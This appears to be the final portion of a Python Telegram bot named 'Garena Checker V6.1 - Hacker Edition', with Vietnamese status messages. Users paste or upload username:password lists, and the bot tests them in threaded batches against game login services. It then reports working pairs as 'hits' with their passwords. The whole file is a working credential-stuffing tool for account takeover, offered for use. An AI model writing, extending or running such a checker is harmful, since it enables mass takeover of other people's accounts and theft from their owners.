    for k, v in SERVICE_ROUTES.items():
        m += f"{v['icon']} <b>{k}</b>: {v['desc']}\n"
    safe_send(msg.chat.id, m)

@bot.message_handler(commands=['stop'])
def cmd_stop(msg):
    if not check_membership(msg): return
    global checking
    stop_event.set()
    checking = False
    safe_send(msg.chat.id, "🛑 Da dung check!")

@bot.message_handler(commands=['check'])
def cmd_check(msg):
    if not check_membership(msg): return
    parts = msg.text.split()
    if len(parts) < 2:
        safe_send(msg.chat.id, "❌ /check user:pass [service]")
        return
    acc = parts[1].replace('|', ':')
    service = parts[2] if len(parts) > 2 and parts[2] in SERVICE_ROUTES else "lienquan"
    accounts = loc_accounts(acc)
    if not accounts:
        safe_send(msg.chat.id, "❌ Sai format! Dung: user:pass")
        return
    u, p = accounts[0]
    threading.Thread(target=lambda: do_check(msg.chat.id, u, p, service)).start()

@bot.message_handler(commands=['checkmulti'])
def cmd_checkmulti(msg):
    if not check_membership(msg): return
    text = msg.text.replace('/checkmulti', '').strip()
    if not text:
        safe_send(msg.chat.id, "❌ /checkmulti user1:pass1\\nuser2:pass2 [service]")
        return
    lines = text.split('\n')
    service = "lienquan"
    if lines and lines[-1].strip() in SERVICE_ROUTES:
        service = lines[-1].strip()
        lines = lines[:-1]
    accounts = loc_accounts('\n'.join(lines).replace(',', '\n').replace('|', ':'))
    if not accounts:
        safe_send(msg.chat.id, "❌ Khong tim thay acc!")
        return
    safe_send(msg.chat.id, f"📊 Check {len(accounts)} accounts...")
    threading.Thread(target=lambda: do_batch(msg.chat.id, accounts, service)).start()

@bot.message_handler(commands=['checkall'])
def cmd_checkall(msg):
    if not check_membership(msg): return
    chat_id = msg.chat.id
    if chat_id in pending_accounts and pending_accounts[chat_id]:
        accs = pending_accounts[chat_id]
        pending_accounts[chat_id] = []
        threading.Thread(target=lambda: do_all(chat_id, accs)).start()
    else:
        safe_send(chat_id, "❌ Khong co acc nao dang cho!")

@bot.message_handler(content_types=['text'])
def handle_text(msg):
    if not check_membership(msg): return
    text = msg.text.strip()
    if text.startswith('/'): return
    accounts = loc_accounts(text.replace('|', ':'))
    if not accounts: return
    pending_accounts[msg.chat.id] = accounts
    preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
    safe_send(msg.chat.id, f"📊 LOC {len(accounts)} ACCOUNTS\nPreview:\n{preview}\n👇 /checkall - Check tat ca")

@bot.message_handler(content_types=['document'])
def handle_doc(msg):
    if not check_membership(msg): return
    try:
        if not msg.document.file_name.endswith('.txt'):
            safe_send(msg.chat.id, "❌ Chi ho tro file .txt!")
            return
        file = bot.get_file(msg.document.file_id)
        content = bot.download_file(file.file_path).decode('utf-8', errors='ignore')
        accounts = loc_accounts(content.replace('|', ':'))
        if not accounts:
            safe_send(msg.chat.id, "❌ Khong tim thay acc!")
            return
        pending_accounts[msg.chat.id] = accounts
        preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
        safe_send(msg.chat.id, f"✅ LOC {len(accounts)} ACCOUNTS\nPreview:\n{preview}\n👇 /checkall")
    except Exception as e:
        safe_send(msg.chat.id, f"❌ Loi: {e}")

# ========== CHECK FUNCTIONS ==========
def do_check(chat_id, user, pwd, service):
    result = check_api(user, pwd, service)
    res = result.get('result', 'unknown')
    detail = {
        "user": user, "pwd": pwd, "service": service,
        "status": res, "time": datetime.now().strftime("%H:%M:%S")
    }
    if res == 'hit':
        safe_send(chat_id, format_full_info(user, pwd, service, result))
        update_stats(hit=1, details=[detail])
    elif res == 'dead':
        safe_send(chat_id, format_dead(user, pwd, service))
        update_stats(dead=1, details=[detail])
    else:
        safe_send(chat_id, format_error(user, pwd, service))
        update_stats(err=1, details=[detail])

def do_batch(chat_id, accounts, service):
    global checking, stats
    if checking:
        safe_send(chat_id, "⚠️ Dang check roi!")
        return
    
    checking = True
    stop_event.clear()
    total = len(accounts)
    stats = {
        "total": total, "checked": 0, "hits": 0,
        "dead": 0, "errors": 0, "start_time": time.time()
    }
    all_results = []
    
    safe_send(chat_id, f"🔍 <b>BAT DAU CHECK</b>\n📊 {total} acc | {SERVICE_ROUTES.get(service,{}).get('desc',service)}")
    
    def process(u, p):
        if stop_event.is_set(): return
        r = check_api(u, p, service)
        res = r.get('result', 'unknown')
        detail = {
            "user": u, "pwd": p, "service": service,
            "status": res, "time": datetime.now().strftime("%H:%M:%S")
        }
        all_results.append(detail)
        with stats_lock:
            stats["checked"] += 1
            if res == 'hit':
                stats["hits"] += 1
                safe_send(chat_id, format_full_info(u, p, service, r))
            elif res == 'dead':
                stats["dead"] += 1
            else:
                stats["errors"] += 1
    
    batches = [accounts[i:i+CHECKMULTI_BATCH_SIZE] for i in range(0, total, CHECKMULTI_BATCH_SIZE)]
    for idx, batch in enumerate(batches, 1):
        if stop_event.is_set(): break
        safe_send(chat_id, f"📦 BATCH {idx}/{len(batches)} - {len(batch)} acc...")
        with ThreadPoolExecutor(max_workers=CHECKMULTI_THREADS) as ex:
            futures = {ex.submit(process, u, p): (u, p) for u, p in batch}
            for f in as_completed(futures):
                if stop_event.is_set():
                    ex.shutdown(wait=False)
                    break
        elapsed = time.time() - stats["start_time"]
        pct = (stats["checked"] / total) * 100 if total > 0 else 0
        safe_send(chat_id, f"📊 {stats['checked']}/{total} ({pct:.1f}%) | ✅{stats['hits']} ❌{stats['dead']} ⚠️{stats['errors']}")
        if idx < len(batches):
            time.sleep(CHECKMULTI_BATCH_DELAY)
    
    checking = False
    elapsed = time.time() - stats["start_time"]
    update_stats(
        hit=stats["hits"], dead=stats["dead"], err=stats["errors"],
        accounts=accounts, details=all_results
    )
    
    hits = [r for r in all_results if r['status'] == 'hit']
    summary = f"✅ <b>CHECK HOAN TAT!</b>\n✅{stats['hits']} ❌{stats['dead']} ⚠️{stats['errors']}\n⏱ {elapsed:.1f}s"
    if hits:
        summary += f"\n📌 HIT: {len(hits)}"
        for r in hits[:10]:
            summary += f"\n  ✅ {r['user']}:{r['pwd']}"
        if len(hits) > 10:
            summary += f"\n  ... +{len(hits)-10}"
    safe_send(chat_id, summary)

def do_all(chat_id, accounts):
    global checking
    if checking:
        safe_send(chat_id, "⚠️ Dang check roi!")
        return
    if not accounts:
        safe_send(chat_id, "❌ Khong co accounts!")
        return
    
    checking = True
    stop_event.clear()
    total_services = len(SERVICE_ROUTES)
    all_results = []
    stats_all = {
        "total": len(accounts) * total_services,
        "checked": 0, "hits": 0, "dead": 0, "errors": 0,
        "start_time": time.time()
    }
    
    safe_send(chat_id, f"⚡ <b>CHECK TAT CA SERVICE</b>\n📊 {len(accounts)} acc x {total_services} services")
    
    def process(u, p, svc):
        if stop_event.is_set(): return
        r = check_api(u, p, svc)
        res = r.get('result', 'unknown')
        detail = {
            "user": u, "pwd": p, "service": svc,
            "status": res, "time": datetime.now().strftime("%H:%M:%S")
        }
        all_results.append(detail)
        with stats_lock:
            stats_all["checked"] += 1
            if res == 'hit':
                stats_all["hits"] += 1
                safe_send(chat_id, format_full_info(u, p, svc, r))
            elif res == 'dead':
                stats_all["dead"] += 1
            else:
                stats_all["errors"] += 1
    
    batches = [accounts[i:i+CHECKMULTI_BATCH_SIZE] for i in range(0, len(accounts), CHECKMULTI_BATCH_SIZE)]
    for idx, batch in enumerate(batches, 1):
        if stop_event.is_set(): break
        tasks = [(u, p, svc) for u, p in batch for svc in SERVICE_ROUTES.keys()]
        with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as ex:
            futures = {ex.submit(process, u, p, svc): (u, p, svc) for u, p, svc in tasks}
            for f in as_completed(futures):
                if stop_event.is_set():
                    ex.shutdown(wait=False)
                    break
        pct = (stats_all["checked"] / stats_all["total"]) * 100 if stats_all["total"] > 0 else 0
        safe_send(chat_id, f"📊 {stats_all['checked']}/{stats_all['total']} ({pct:.1f}%) | ✅{stats_all['hits']}")
        if idx < len(batches):
            time.sleep(CHECKMULTI_BATCH_DELAY)
    
    checking = False
    elapsed = time.time() - stats_all["start_time"]
    update_stats(
        hit=stats_all["hits"], dead=stats_all["dead"], err=stats_all["errors"],
        accounts=accounts, details=all_results
    )
    
    hits = [r for r in all_results if r['status'] == 'hit']
    summary = f"✅ <b>CHECK ALL HOAN TAT!</b>\n✅{stats_all['hits']} ❌{stats_all['dead']} ⚠️{stats_all['errors']}\n⏱ {elapsed:.1f}s"
    if hits:
        summary += f"\n📌 HIT: {len(hits)}"
        for r in hits[:10]:
            summary += f"\n  ✅ {r['user']}:{r['pwd']} ({r['service']})"
        if len(hits) > 10:
            summary += f"\n  ... +{len(hits)-10}"
    safe_send(chat_id, summary)

# ========== MAIN ==========
def main():
    print("=" * 50)
    print("    GARENA CHECKER V6.1 - HACKER EDITION")
    print("    ADMIN: @baohuyno1")
    print("    TIKTOK: @baohuy1109")
    print("    WEB: http://0.0.0.0:10000")
    print("    ===== HIEU UNG 3D + HACKER DEP =====")
    print("    ===== AM THANH TU DONG PHAT =====")
    print("    ===== KHONG LUU ACCOUNT =====")
    print("    ===== FULL INFO CHI TIET =====")
    print("=" * 50)
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            print(f"[!] Loi: {e}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Bot stopped!")
        sys.exit(0)
